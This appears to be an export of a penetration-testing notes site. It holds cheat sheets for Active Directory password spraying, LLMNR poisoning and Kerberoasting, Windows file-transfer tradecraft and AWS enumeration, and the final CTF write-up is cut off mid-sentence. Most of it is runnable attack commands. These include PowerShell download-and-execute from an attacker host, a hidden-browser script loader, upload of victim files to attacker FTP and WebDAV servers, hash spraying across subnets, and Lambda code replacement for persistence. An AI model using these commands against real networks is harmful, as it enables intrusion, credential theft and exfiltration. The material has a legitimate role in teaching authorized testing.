[{"categories":["Active Directory","MiTM"],"contents":"** 1. Initial Enumration and Identification ** a. netexec User Enumration sudo netexec smb \u0026lt;dc-ip\u0026gt; -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; --users Using netexec to enumerate domain users\nb. netexec Group Enumeration sudo netexec smb \u0026lt;dc-ip\u0026gt; -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; --groups Using netexec to enumerate domain groups\nc. netexec Logged on User Enumeration sudo netexec smb \u0026lt;dc-ip\u0026gt; -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; --loggedon-users Check what user are logged on the server at that time\nd. netexec SMB Share Enumeration sudo netexec 10.10.10.0/24 smb -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; --shares Check if our user has access to any shares\ne. Bloodhound (Legacy) sudo neo4j sudo ./Bloodhound sudo bloodhound-python -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!2\u0026#39; -ns \u0026lt;dc-ip\u0026gt; -d dotpirate.local -c all Spin up neo4j\nDownload BloudHound Lgacy and run it\nDownload and run BloodHound Ingestor bloodhound-python\nAnalyze the Actice Directory User Permissions and ACL(s)\nf. RPC user enumeration rpcclient -U \u0026#34;dotpirate.local/dotpirate\u0026#34; \u0026lt;dc-ip\u0026gt; -c \u0026#34;enumdomusers\u0026#34; (Enter Password) Using Credentials through RPC to enumerate users\ng. RPC User Description Enumeration rpcclient -U \u0026#34;dotpirate.local/dotpirate\u0026#34; \u0026lt;dc-ip\u0026gt; -c \u0026#34;querydispinfo\u0026#34; (Enter Password) Pulling User\u0026rsquo;s description through RPC\nh. Pulling User Description via LDAP and netexec sudo netexec ldap \u0026lt;target-ip\u0026gt; -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; -M get-desc-users Get description of the users. My contained a password\n** 2. Do I have any access? (Protocol Spray?)** a. netexec SMB Access sudo netexec smb 10.10.10.0/24 -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; sudo netexec smb 10.10.10.0/24 -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; --local-auth Check if our user can authenitcated into any host on the network via SMB\nb. netexec WINRM Access sudo netexec winrm 10.10.10.0/24 -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; Check if we can access any host in the network through WINRM\nc. evil-winrm WINRM Access sudo evil-winrm -i 10.10.10.11 -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; Do not rely only on one tool\nUse evil-winrm to check if we have acces through WINRM porotocol\nd. netexec RDP Access sudo netexec rdp 10.10.10.0/24 -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; sudo netexec rdp 10.10.10.0/24 -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; --local-auth Check if we can access any host in the netrwork through RDP\nf. netexec MSSQL Access sudo netexec mssql 10.10.10.0/24 -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; sudo netexec rdp 10.10.10.0/24 -u \u0026#39;dotpirate\u0026#39; -p \u0026#39;l3tsh4ck!\u0026#39; --local-auth Check if we can access any host in the netrwork through MSSQL\ng. impacket MSSQL Access sudo impacket-mssqlclient -p 1433 dotpirate.local/dotpirate@\u0026lt;target-ip\u0026gt; sudo impacket-mssqlclient -p 1433 PC1/dotpirate@\u0026lt;target-ip\u0026gt; -windows-auth Check if we can access a specific host using a different tool through MSSQL\n","date":"2025-08-23T00:00:00Z","permalink":"https://hack.com.cy/notes/active-directory/enumeration/with-credentials/","section":"notes","tags":["Active Directory","Assumed Breach"],"title":""},{"categories":["Active Directory","MiTM"],"contents":"** 1. Initial Enumration and Identification ** a. Wireshark sudo -E wireshark Choose the ethernet we want to sniff on\nFilter for ARP protocol\nLook for NETBIOS names\nLook for DNS and domain names\nLook for unsecure protocols such as TELNET and FTP\nb. TCPdump sudo tcpdump -i eth0 -w capture.pcap Choose the ethernet we want to sniff on\nSaves the output in .pcap file\nc. Net-Creds sudo python net-creds.py -f capture.pcap Install net-creds Search for credentials in the .pcap file\nd. Responder sudo responder -I eth0 -A Choose the ethernet we want to analyze traffic on\nAnalyze mode to see NBT-NS, Browser and LLMNR requests without responding\ne. Utilizing DNS to gather Domain Controllers cat /etc/resolv.conf - internal domain dotpirate.local dig -t SRV _gc._tcp.dotpirate.local dig -t SRV _ldap._tcp.dc._msdcs.dotpirate.local dig -t SRV _kerberos._tcp.dotpirate.local dig -t SRV _ldap._tcp.dotpirate.local Replace dotpirate.local with the domain name assigned to resolv.conf file\nf. Enumerating AD CS / CA Authority openssl s_client -showcerts -connect \u0026lt;dc-ip\u0026gt;:3269 | openssl x509 -noout -text | less -S Replace \u0026lt;dc-ip\u0026gt; with the Domain Controller IP\n2. LLMNR/NBT-NS Poisoning a. From Linux sudo responder -I eth0 Start poisoning with reposnder on default settings\nb. From Windows Import-Module .\\Inveigh.ps1 (Get-Command Invoke-Inveigh).Parameters Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y LLMNR and NBNS spoofing\nInveigh Documentation and default options\n** 3. Username Enumeration (on Domain Controller) a. Kerberos sudo ntpdate -s dotpirate.local ./kerbrute_linux_amd64 userenum -d DOTPIRATE.LOCAL --dc \u0026lt;dc-ip\u0026gt; wordlist.txt -o valid-ad-users.txt Make sure to synchonize time with DC\nReplace domain controller IP with \u0026lt;dc-ip\u0026gt;\nReplace wordlist.txt with this or with a smaller one such as this\nKerberos pre-authentication failures often will not trigger logs or alerts.\nDownload and Installed the binary from here\nb. enum4linux SMB NULL Session enum4linux -U \u0026lt;dc-ip\u0026gt; | grep \u0026#34;user:\u0026#34; | cut -f2 -d\u0026#34;[\u0026#34; | cut -f1 -d\u0026#34;]\u0026#34; Filtering the output to grab only the users.\nReplace \u0026lt;dc-ip\u0026gt; with Domain Controller IP\nc. rpcclient SMB NULL Session rpcclient -U \u0026#34;\u0026#34; -N \u0026lt;dc-ip\u0026gt; rpcclient? $\u0026gt; enumdomusers Utilizing RPC to enumerate valid users.\nd. netexec rid bruteforce netexec smb \u0026lt;dc-ip\u0026gt; -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --rid-brute Bruteforcing rid to gather users and groups\ne. netexec \u0026ndash;users flag netexec smb \u0026lt;dc-ip\u0026gt; --users Gives more information that just a list of users\nf. ldapsearch LDAP Anonymous bind ldapsearch -h \u0026lt;dc-ip\u0026gt; -x -b \u0026#34;DC=DOTPIRATE,DC=LOCAL\u0026#34; -s sub \u0026#34;(\u0026amp;(objectclass=user))\u0026#34; | grep sAMAccountName: | cut -f2 -d\u0026#34; \u0026#34; Utilizing ldapsearch with a custom query to gather users from the SAMAccountName property\ng. windapsearch LDAP Anonymous bind ./windapsearch.py --dc-ip \u0026lt;dc-ip\u0026gt; -u \u0026#34;\u0026#34; -U -u flag is to spcify a user whil -U is to search for users.\n** 4. Password Spray ** a. rpcclient password spray PASSWORD=\u0026#34;Welcome2025\u0026#34; for u in $(cat valid_users.txt); do rpcclient -U \u0026#34;$u%$PASSWORD\u0026#34; -c \u0026#34;getusername;quit\u0026#34; \u0026lt;dc-ip\u0026gt; | grep Authority sleep 5 done Utilizing bash for loop and rpcclient with single password\nsleep 5 (or even 10‚Äì15 sec) gives breathing room and avoids triggering threshold-based lockouts.\nReplace \u0026lt;dc-ip\u0026gt; with target DC\nb. kerberos password spray (safer) kerbrute passwordspray -d dotpirate.local --dc \u0026lt;dc-ip\u0026gt; ad_users.txt Welcome2025 Kerbrute is lockout-safe by design (it only attempts Kerberos pre-auth, which doesn‚Äôt increment bad password counters in AD)\nReplace \u0026lt;dc-ip\u0026gt; with target DC\nc. netexec password spray netexec smb 10.10.10.11 -u users.txt -p \u0026#39;Welcome2025\u0026#39; \\ --no-bruteforce \\ --ufail-limit 3 \\ --gfail-limit 10 \\ --jitter 3 \\ -t 1 --no-bruteforce LIMIT ensures it does not try user1=password1, user2=password2, etc. (so it only sprays the single password against the whole list).\n--ufail-limit LIMIT max failures per user before it stops (e.g., \u0026ndash;ufail-limit 3 so you don‚Äôt risk lockouts).\n--gfail-limit LIMIT global cap on failures across all attempts.\n--jitter INTERVAL adds random delays between attempts, reducing the chance of triggering lockouts.\n-t THREADS adjust concurrency (lower = slower, safer).\nd. netexec Local Administrator spray netexec smb --local-auth 10.10.10.0/23 -u administrator -H 111109182de666ddd6579eb084977777 -t 1 --jitter 2 --fail-limit 10 | grep + Spray the hash against every host in the subnet specified\nOne attempt at a time with random delay between attempts\n--fail-limit to cap attempts if it‚Äôs failing everywhere\ne. Password Spray from domian-joined Windows-Host Import-Module .\\DomainPasswordSpray.ps1 Invoke-DomainPasswordSpray -Password Welcome2025 -OutFile output.txt -ErrorAction SilentlyContinue Automatically generate a user list from Active Directory\nQuery the domain password policy\nExclude user accounts within 1 attempt of locking out\nDownload and Import DomainPasswordSpray\n** 5. Kerberoasting and AS-REP Roasting ** a. Kerberoast with user list sudo impacket-GetUserSPNs -no-preauth \u0026#34;anyknownuser\u0026#34; -usersfile users.txt -dc-host \u0026lt;dc-ip\u0026gt; \u0026#34;dotpirate.local\u0026#34;/ Request Kerberos service tickets for any service account with a Service Principal Name (SPN)\nb. AS-REP Roasting sudo impacket-GetNPUsers dotpirate.local/ -dc-ip \u0026lt;dc-ip\u0026gt; -request Checks if Kerberos pre-authentication is disabled.\n** 6. Bruteforce Username as Password ** Note: IF we found valid ad users we can use the usernames as passwords * sudo netexec smb -u ad-users.txt -p ad-users.txt --no-bruteforce --continue-on-succes ","date":"2025-08-23T00:00:00Z","permalink":"https://hack.com.cy/notes/active-directory/enumeration/no-credentials/","section":"notes","tags":["Active Directory"],"title":"Active Directory"},{"categories":["File Trasfers"],"contents":"** Using Powershell to tranfer files ** **1. Base64 Copy Paste ** a. From Linux to Windows cat file | base64 -w 0; echo aGFjay5jb20uY3kgYXQgeW91ciBzZXJ2aWNlICg6Cg== [IO.File]::WriteAllBytes(\u0026#34;C:\\Users\\Public\\file\u0026#34;, [Convert]::FromBase64String(\u0026#34;aGFjay5jb20uY3kgYXQgeW91ciBzZXJ2aWNlICg6Cg==\u0026#34;)) cat C:\\Users\\Public\\file Use base64 to encode the file we want to tranfer\nCopy the output and paste it to a PowerShell function for decoding\nAttempt to read the contents of the decoded base64 file\nb. From Windows to Linux [Convert]::ToBase64String((Get-Content -path \u0026#34;C:\\Users\\Public\\file\u0026#34; -Encoding byte)) aGFjay5jb20uY3kgYXQgeW91ciBzZXJ2aWNlICg6Cg== echo aGFjay5jb20uY3kgYXQgeW91ciBzZXJ2aWNlICg6Cg== | base64 -d \u0026gt; file Encode file using Powershell and copy the output\nPaste the output and decoded in Linux using base64 command\n** 2. Web Downloads \u0026amp; Uploads ** a. Download a file (WebClinet) python3 -m http.server 80 (New-Object Net.WebClient).DownloadFile(\u0026#39;http://\u0026lt;attacker-ip\u0026gt;/file\u0026#39;,\u0026#39;C:\\Users\\Public\\Downloads\\file\u0026#39;) Spin up a webserver using python on attacker\u0026rsquo;s machine\nUse WebClient download the file in spicified path\nb. Download and Execute File in memory cat command.ps1 ipconfig python3 -m http.server 80 IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://\u0026lt;attacker-ip\u0026gt;/file.ps1\u0026#39;) Create a file that includes a command and serve it with a python webserver\nUse Invoke-Expression (IEX) to run the file command directly in memory\nc. Download a Hidden IE com object cat command.ps1 ipconfig python3 -m http.server 80 $ie = New-Object -ComObject InternetExplorer.Application; $ie.visible = $False; $ie.navigate(\u0026#39;http://\u0026lt;attacker-ip\u0026gt;/command.ps1\u0026#39;); Start-Sleep -s 5; $r = $ie.Document.body.innerHTML; $ie.quit(); IEX $r Create a hidden Internet Explorer instance and hide the windows\nNavigates and waits for the script to load\nExtracts, Closes Internet Explorer Window then Executes the malicious payload\nd. Download a file with CMD (certutil) python3 -m http.server 80 certutil -urlcache -f http://\u0026lt;attacker-ip\u0026gt;/file -o file Spin up a python webserver\nUses CMD and a built-in certutil.exe to download a file\ne. Upload a file with PowerShell python3 -m venv .venv source .venv/bin/activate pip3 install uploadserver python3 -m uploadserver 80 powershell.exe -ep bypass . .\\PSUpload.ps1 Invoke-FileUpload -Uri http://\u0026lt;attacker-ip\u0026gt;/upload -File C:\\Users\\Public\\Downloads\\file Create a python3 virtual environment\nStart the python3 upload server\nDownload, Import and use this PowerShell script to upload the file\n** 3. Using SMB to Download data ** a. Using impacket-smbserver to Download sudo impacket-smbserver share -smb2support /home/kali/ShareDiretory -user dotpirate -password dotpirate net use n: \\\\\u0026lt;attacker-ip\u0026gt;\\share /user:dotpirate dotpirate copy ./file.txt n:\\file.txt Create an smbshare using impacket-smbserver which requires username and password\nMap the smb share on the windows target\nCopy the file over to the mapped share using CMD\nb. Using WebDav Server to Upload (requires elevated privileges) cd ~/Desktop mkdir webdav-server cd webdav-server sudo apt install python3-wsgidav wsgidav --host=0.0.0.0 --port=80 --root=/home/kali/Desktop/webdav-server --auth=anonymous sc query WebClient sc start WebClient dir \\\\\u0026lt;attacker-ip\u0026gt;\\DavWWWRoot copy C:\\Users\\Public\\Downloads\\file \\\\\u0026lt;attacker-ip\u0026gt;\\DavWWWRoot\\file Download and install the python3 webdav server\nCreate a directory to Serve the server by specifying the root directory with --root=\nCheck if WebClient service is running on Windows (requires elevated privileges)\nCheck connection, and then upload the file\n** 4. Using FTP to Download and Uplaoad ** a. Download Files python3 -m venv .venv source .venv/bin/activate sudo pip3 install pyftpdlib sudo python3 -m pyftpdlib --port 21 (New-Object Net.WebClient).DownloadFile(\u0026#39;ftp://\u0026lt;attacker-ip\u0026gt;/file.txt\u0026#39;, \u0026#39;C:\\Users\\Public\\file.txt\u0026#39;) Create a python3 virtual environment\nInstall python3 ftp module and setup python3 ftp server\nDownload the file on the windows host\nb. Upload Files python3 -m venv .venv source .venv/bin/activate sudo pip3 install pyftpdlib python3 -m pyftpdlib --port 21 --write (New-Object Net.WebClient).UploadFile(\u0026#39;ftp://\u0026lt;attacker-ip\u0026gt;/file\u0026#39;, \u0026#39;C:\\Users\\Public\\file\u0026#39;) Create a python3 virtual environment\nInstall python3 ftp module and setup python3 ftp server with write permissions\nUpload the file to attackers ftp server\n","date":"2025-08-22T00:00:00Z","permalink":"https://hack.com.cy/notes/file-transfers/windows/windows/","section":"notes","tags":["File Transfers","Powershell","CMD","Python"],"title":"Windows File Transfers"},{"categories":["Cloud","AWS"],"contents":"üîç AWS CLI Privilege Escalation \u0026amp; Recon Playbook 1. Identity ‚Äì Who am I? Get current identity aws sts get-caller-identity --profile \u0026lt;profile\u0026gt; Returns Account ID, User ID, and ARN of your current identity.\nConfirms if you are a user, a role, or a temporary session (STS).\nGet account alias aws iam list-account-aliases --profile \u0026lt;profile\u0026gt; Displays the friendly account alias (instead of numeric ID).\nUseful if multiple accounts are in play.\n2. IAM ‚Äì Users, Roles, and Policies List IAM users aws iam list-users --profile \u0026lt;profile\u0026gt; Shows all users in the account.\nOther accounts = potential pivot targets.\nList IAM groups aws iam list-groups --profile \u0026lt;profile\u0026gt; Groups may carry privileged policies.\nList IAM roles aws iam list-roles --profile \u0026lt;profile\u0026gt; Roles are valuable targets ‚Äî if assumable, they can lead to privesc.\nShow attached managed policies aws iam list-attached-user-policies --user-name \u0026lt;username\u0026gt; --profile \u0026lt;profile\u0026gt; Managed policies are reusable, often broad (e.g., AdministratorAccess).\nShow inline policies aws iam list-user-policies --user-name \u0026lt;username\u0026gt; --profile \u0026lt;profile\u0026gt; Inline policies are custom rules attached directly to users.\nDump policy JSON aws iam get-policy --policy-arn \u0026lt;arn\u0026gt; --profile \u0026lt;profile\u0026gt; aws iam get-policy-version --policy-arn \u0026lt;arn\u0026gt; --version-id v1 --profile \u0026lt;profile\u0026gt; Lets you read the actual permissions granted by a policy.\n3. EC2 \u0026amp; VPC ‚Äì Instances \u0026amp; Networking List instances aws ec2 describe-instances --profile \u0026lt;profile\u0026gt; Shows running EC2 instances.\nLook for attached IAM instance profiles.\nList subnets aws ec2 describe-subnets --profile \u0026lt;profile\u0026gt; Enumerates network ranges.\nHelps plan lateral movement.\nList security groups aws ec2 describe-security-groups --profile \u0026lt;profile\u0026gt; Reveals firewall rules (open ports, allowed IPs).\nCheck instance IAM roles aws ec2 describe-iam-instance-profile-associations --profile \u0026lt;profile\u0026gt; Tells you which IAM roles are bound to EC2.\nThose roles often hold privileged permissions.\n4. S3 ‚Äì Object Storage List buckets aws s3api list-buckets --profile \u0026lt;profile\u0026gt; Shows all visible buckets.\nList bucket contents aws s3 ls s3://\u0026lt;bucket-name\u0026gt; --profile \u0026lt;profile\u0026gt; Enumerates files.\nTry downloading (aws s3 cp) if possible.\n5. DynamoDB ‚Äì Database Recon List tables aws dynamodb list-tables --profile \u0026lt;profile\u0026gt; Enumerates DynamoDB tables.\nDump table contents aws dynamodb scan --table-name \u0026lt;table\u0026gt; --profile \u0026lt;profile\u0026gt; Reads all items (if allowed).\nCan reveal sensitive data or credentials.\n6. Elastic Beanstalk ‚Äì Applications \u0026amp; Secrets List Beanstalk applications aws elasticbeanstalk describe-applications --profile \u0026lt;profile\u0026gt; Entry point for hunting app configs and env vars.\nList environments for an app aws elasticbeanstalk describe-environments --application-name \u0026lt;AppName\u0026gt; --profile \u0026lt;profile\u0026gt; Each environment is a deployed version of the app.\nGet environment config aws elasticbeanstalk describe-configuration-settings --application-name \u0026lt;AppName\u0026gt; --environment-name \u0026lt;EnvName\u0026gt; --profile \u0026lt;profile\u0026gt; üî• High-value target: often leaks AWS keys, DB creds, API tokens in environment variables.\n7. Lambda ‚Äì Functions \u0026amp; Roles List Lambda functions aws lambda list-functions --profile \u0026lt;profile\u0026gt; Finds deployed serverless functions.\nGet function configuration aws lambda get-function-configuration --function-name \u0026lt;fn\u0026gt; --profile \u0026lt;profile\u0026gt; Metadata + environment variables (secrets often stored here).\nGet function code aws lambda get-function --function-name \u0026lt;fn\u0026gt; --profile \u0026lt;profile\u0026gt; Retrieves actual function code (if allowed).\nUseful for finding hardcoded credentials.\n8. Secrets Manager \u0026amp; SSM List secrets aws secretsmanager list-secrets --profile \u0026lt;profile\u0026gt; Enumerates secrets stored in AWS Secrets Manager.\nGet secret value aws secretsmanager get-secret-value --secret-id \u0026lt;id\u0026gt; --profile \u0026lt;profile\u0026gt; Dumps the secret content.\nList SSM parameters aws ssm describe-parameters --profile \u0026lt;profile\u0026gt; Enumerates SSM parameter store.\nGet parameter value aws ssm get-parameter --name \u0026lt;param\u0026gt; --with-decryption --profile \u0026lt;profile\u0026gt; Retrieves parameter content (with decryption if required).\n9. Misc Recon CloudFormation stacks aws cloudformation describe-stacks --profile \u0026lt;profile\u0026gt; Reveals deployed infra as IaC templates.\nECR repositories aws ecr describe-repositories --profile \u0026lt;profile\u0026gt; Lists Docker image repos.\nImages may contain secrets.\nRDS instances aws rds describe-db-instances --profile \u0026lt;profile\u0026gt; Lists relational databases (RDS).\nCan combine with secrets to access DBs.\nüß≠ Workflow Summary Identity ‚Üí Who am I? (sts get-caller-identity) IAM ‚Üí What perms do I have? (list-roles, list-attached-user-policies) Services ‚Üí Enumerate EC2, S3, DynamoDB, etc. Secrets ‚Üí Look for keys in Beanstalk, Lambda, SSM, Secrets Manager. Escalate ‚Üí If you get new creds/roles, assume them and restart the loop. ‚ö° Tip: Always start with describe/list ‚Üí they‚Äôre low-noise, read-only and tell you what‚Äôs possible without modifying anything.\n","date":"2025-08-21T00:00:00Z","permalink":"https://hack.com.cy/notes/cloud/aws/all-in-one/all-in-one/","section":"notes","tags":["AWC CLI","Pacu","S3 Buckets","IAM","Lambda","SNS","Beanstalk","EC2"],"title":"All in one cheat-sheet for AWS Enumeration"},{"categories":["Cloud","AWS","Cheet Sheet"],"contents":"1. List EC2 Instances aws ec2 describe-instances --region [region] Shows instance IDs, public IPs, AMIs, key names, IAM roles, etc.\nUse JMESPath filters for cleaner output:\naws ec2 describe-instances --query \u0026#34;Reservations[_].Instances[_].[InstanceId,PublicIpAddress,State.Name,KeyName,IamInstanceProfile.Arn]\u0026#34; 2. Get Detailed Info on a Specific Instance aws ec2 describe-instances --instance-ids [i-xxxxxxxxxxxxxxx] 3. Identify IAM Role Attached to the Instance aws ec2 describe-instances --query \u0026#34;Reservations[*].Instances[*].IamInstanceProfile.Arn\u0026#34; Then grab role name and enumerate permissions:\naws iam get-instance-profile --instance-profile-name [name] 4. List Security Groups aws ec2 describe-security-groups Look for open ports, especially 0.0.0.0/0 on SSH (22), RDP (3389), or custom ports.\na. Check for overly permissive inbound rules: aws ec2 describe-security-groups --query \u0026#34;SecurityGroups[_].IpPermissions[_].{From ,To ,CIDR }\u0026#34; 5. Describe Network Interfaces aws ec2 describe-network-interfaces See public/private IPs, subnet info, VPC IDs, attachment info.\n6. List AMIs (Amazon Machine Images) aws ec2 describe-images --owners self Use this to find custom images that may contain secrets or sensitive software.\n7. Check EBS Volume Info aws ec2 describe-volumes Look for unencrypted volumes, large or attached volumes.\na. Snapshot enumeration (potential data leaks): aws ec2 describe-snapshots --owner-ids self 8. Enumerate Key Pairs aws ec2 describe-key-pairs You can\u0026rsquo;t get private keys from AWS, but public names may hint at user naming patterns or poor key hygiene.\n9. Describe Regions \u0026amp; Availability Zones aws ec2 describe-regions aws ec2 describe-availability-zones ","date":"2025-08-21T00:00:00Z","permalink":"https://hack.com.cy/notes/cloud/aws/ec2/ec2/","section":"notes","tags":["AWC CLI","Pacu","EC2"],"title":"Basic EC2 Enumeration Cheet Sheet"},{"categories":["Cloud","AWS","Cheet Sheet"],"contents":"List Beanstalk applications aws elasticbeanstalk describe-applications --profile \u0026lt;profile\u0026gt; Entry point for hunting app configs and env vars.\nList environments for an app aws elasticbeanstalk describe-environments --application-name \u0026lt;AppName\u0026gt; --profile \u0026lt;profile\u0026gt; Each environment is a deployed version of the app.\nGet environment config aws elasticbeanstalk describe-configuration-settings --application-name \u0026lt;AppName\u0026gt; --environment-name \u0026lt;EnvName\u0026gt; --profile \u0026lt;profile\u0026gt; üî• High-value target: often leaks AWS keys, DB creds, API tokens in environment variables.\nUsing Pacu Pacu (low_priv_sess:imported-low_priv_sess) \u0026gt; run elasticbeanstalk__enum --regions us-east-1 ","date":"2025-08-21T00:00:00Z","permalink":"https://hack.com.cy/notes/cloud/aws/elastic-beanstalk/beanstalk/","section":"notes","tags":["AWC CLI","Pacu","Elastic Beanstalk"],"title":"Basic Elastic Beanstalk Enumeration Cheet Sheet"},{"categories":["Cloud","AWS","Cheet Sheet"],"contents":"1. List IAM Users aws iam list-users 2. Get User Permissions a. List attached managed policies aws iam list-attached-user-policies --user-name [user-name] b. List inline policies aws iam list-user-policies --user-name [user-name] c. Get inline policy details aws iam get-user-policy --user-name [user-name] --policy-name [policy-name] 3. List IAM Groups and Permissions a. List groups for a user aws iam list-groups-for-user --user-name [user-name] b. List group policies aws iam list-attached-group-policies --group-name [group-name] aws iam list-group-policies --group-name [group-name] c. Get inline group policy details aws iam get-group-policy --group-name [group-name] --policy-name [policy-name] 4. List IAM Roles and Permissions a. List all roles aws iam list-roles b. Get role details (trust policy) aws iam get-role --role-name [role-name] c. List attached policies aws iam list-attached-role-policies --role-name [role-name] d. List inline policies aws iam list-role-policies --role-name [role-name] e. Get inline role policy details aws iam get-role-policy --role-name [role-name] --policy-name [policy-name] 5. Get and Decode Policy Documents a. Get a managed policy document (by ARN or name) aws iam get-policy --policy-arn [policy-arn] aws iam get-policy-version --policy-arn [policy-arn] --version-id [version-id] 6. View Full IAM Snapshot a. Dump all IAM permissions (users, roles, groups, policies) aws iam get-account-authorization-details Use this to build a full IAM permissions map. Add --filter to target roles/users/groups specifically.\n","date":"2025-08-21T00:00:00Z","permalink":"https://hack.com.cy/notes/cloud/aws/iam/iam/","section":"notes","tags":["AWC CLI","Pacu","IAM"],"title":"Basic IAM Enumeration Cheet Sheet"},{"categories":["Cloud","AWS","Cheet Sheet"],"contents":". List All Lambda Functions aws lambda list-functions --region [region] Shows names, runtimes, ARNs, and last modified dates.\n2. Get Detailed Info on a Function a. Get full function config (IAM role, runtime, env vars, etc.) aws lambda get-function-configuration --function-name [function-name] b. Get code download URL + deployment details aws lambda get-function --function-name [function-name] Returns a pre-signed S3 URL to download the function code.\n3. Check Invocation Access a. Who/what can invoke the function (resource-based policy)? aws lambda get-policy --function-name [function-name] Look for \u0026quot;Principal\u0026quot;: \u0026quot;*\u0026quot; or cross-account permissions.\n4. Identify Triggers / Event Sources a. For async event sources like SQS, DynamoDB, Kinesis: aws lambda list-event-source-mappings --function-name [function-name] b. For function URLs (direct HTTP endpoints) aws lambda get-function-url-config --function-name [function-name] If AuthType is NONE, it may be publicly invokable!\n5. Invoke the Function (if allowed) aws lambda invoke --function-name [function-name] output.json Add --payload if the function expects input:\n\u0026ndash;payload \u0026lsquo;{\u0026ldquo;key\u0026rdquo;: \u0026ldquo;value\u0026rdquo;}\u0026rsquo;\n6. Investigate Attached IAM Role a. Get the role name from get-function-configuration Then enumerate:\naws iam get-role --role-name [role-name] aws iam list-attached-role-policies --role-name [role-name] aws iam list-role-policies --role-name [role-name] Look for overly permissive actions (*, PassRole, SecretsManager, etc.)\n8. Modify or Replace the Function (if you have perms) a. Update function code aws lambda update-function-code --function-name [function-name] --zip-file fileb://payload.zip b. Update configuration (e.g., env variables) aws lambda update-function-configuration --function-name [function-name] --environment \u0026#34;Variables={VAR=value}\u0026#34; Useful for persistence, exfil, or command injection if roles are over-permissioned.\n","date":"2025-08-21T00:00:00Z","permalink":"https://hack.com.cy/notes/cloud/aws/lambda/lambda/","section":"notes","tags":["AWC CLI","Pacu","Lambda"],"title":"Basic Lambda Enumeration Cheet Sheet"},{"categories":["Cloud","AWS","Cheet Sheet"],"contents":"1. List Buckets in the Authenticated Account aws s3 ls 2. Check if a Bucket Exists (No Auth) aws s3 ls s3://[bucket-name] --no-sign-request 3. List Contents of a Public or Accessible Bucket aws s3 ls s3://[bucket-name]/[optional-path] --no-sign-request 4. Download an Object aws s3 cp s3://[bucket-name]/[key] [local-file] --no-sign-request 5. Upload a File (Test Write Access) aws s3 cp test.txt s3://[bucket-name]/test.txt Only works if write access is allowed.\n6. Enumerate Bucket Permissions (Authenticated) a. Get bucket policy aws s3api get-bucket-policy --bucket [bucket-name] b. Get bucket ACL (Access Control List) aws s3api get-bucket-acl --bucket [bucket-name] c. Get Public Access Block settings aws s3api get-bucket-public-access-block --bucket [bucket-name] d. Get CORS configuration (may hint at XSS vectors) aws s3api get-bucket-cors --bucket [bucket-name] 7. List All Buckets \u0026amp; Objects (If Compromised Creds) aws s3api list-buckets aws s3api list-objects --bucket [bucket-name] --output table ","date":"2025-08-21T00:00:00Z","permalink":"https://hack.com.cy/notes/cloud/aws/s3/s3/","section":"notes","tags":["AWC CLI","Pacu","S3 Bucket"],"title":"Basic S3 Bucket Enumeration Cheet Sheet"},{"categories":["Cloud","AWS"],"contents":"Initial Access / Credentials initial_low_priv_credentials = Access Key: AKIA[REDACTED-CTF] Secret Key: [REDACTED-CTF] AWC CLI profile creation aws configure --profile low_priv AWS Access Key ID [None]: AKIA[REDACTED-CTF] AWS Secret Access Key [None]: [REDACTED-CTF] Default region name [None]: us-east-1 Default output format [None]: json Created an aws profile with the credentials given\nEnumeration with low_priv credentials whoami\n‚îî‚îÄ$ aws sts get-caller-identity --profile low_priv { \u0026#34;UserId\u0026#34;: \u0026#34;AIDAUGVOUJQINCWVIJQHB\u0026#34;, \u0026#34;Account\u0026#34;: \u0026#34;289202785296\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::289202785296:user/cgid9oc3krm0fl_low_priv_user\u0026#34; } Gives us the username\nIAM Enumeration with pacu (What Privileges do our user have?) Pacu (low_priv:imported-low_priv) \u0026gt; run iam__bruteforce_permissions --region us-east-1 Used the iam_bruteforce_permissions module from pacu\n**To view our the permissions that the module found we can use the whoami command\nPacu (low_priv:imported-low_priv) \u0026gt; whoami { \u0026#34;UserName\u0026#34;: \u0026#34;cgid9oc3krm0fl_low_priv_user\u0026#34;, \u0026#34;RoleName\u0026#34;: null, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::289202785296:user/cgid9oc3krm0fl_low_priv_user\u0026#34;, \u0026#34;AccountId\u0026#34;: \u0026#34;289202785296\u0026#34;, \u0026#34;UserId\u0026#34;: \u0026#34;AIDAUGVOUJQINCWVIJQHB\u0026#34;, \u0026#34;Roles\u0026#34;: null, \u0026#34;Groups\u0026#34;: [], \u0026#34;Policies\u0026#34;: [], \u0026#34;AccessKeyId\u0026#34;: \u0026#34;AKIA[REDACTED-CTF]\u0026#34;, \u0026#34;SecretAccessKey\u0026#34;: \u0026#34;[REDACTED-CTF]\u0026#34;, \u0026#34;SessionToken\u0026#34;: null, \u0026#34;KeyAlias\u0026#34;: \u0026#34;imported-low_priv\u0026#34;, \u0026#34;PermissionsConfirmed\u0026#34;: false, \u0026#34;Permissions\u0026#34;: { \u0026#34;Allow\u0026#34;: [ \u0026#34;ec2:DescribeSubnets\u0026#34;, \u0026#34;dynamodb:DescribeEndpoints\u0026#34;, \u0026#34;sts:GetCallerIdentity\u0026#34;, \u0026#34;sts:GetSessionToken\u0026#34; ], \u0026#34;Deny\u0026#34;: [] } } -Under the Permissions we can see what we are allowed to do.\nI tried every single one of the permissions however none of it gave me data that i can work with.\naws ec2 describe-subnets --profile low_priv aws dynamodb describe-endpoints --profile low_priv aws sts get-session-token --profile low_priv With a bit of research regarding the word 